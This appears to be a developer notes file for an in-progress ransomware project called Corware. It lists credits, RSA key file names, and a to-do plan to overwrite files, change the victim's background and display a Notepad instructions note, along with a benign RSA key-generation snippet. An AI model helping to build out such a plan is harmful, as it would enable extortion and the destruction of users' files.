Creators:

	* Snavellet (Back/Front-end Developer)
	* DVisual (Application Form Developer)
	* Carrots & Soy Sauce (HTML & CSS Developer)

NOTES:
	* AES KEYS:
		* 00 = PRIVATE KEY
		* 01 = PUBLIC KEY
	* Corware.py has a responsibiity to automatically select which malware to implement.
	* This version is currently in a Debugging / Beta stage and should only be ran by developers / testers

Todo:
	* Generate RSA encryption, decryption + public / private keys
	* Overwrite files, duh.
	* Change users background
	* Run notepad with a note containing instructions

Comments: ( not used )
	# let's first generate an RSA encryption
	key = RSA.generate(2048)

	# define public & private keys
	private_key = key.export_key()
	with open('00.pem', 'wb') as f:
		f.write(private_key)

	public_key = key.publickey().export_key()
	with open('01.pem', 'wb') as f:
		f.write(public_key)
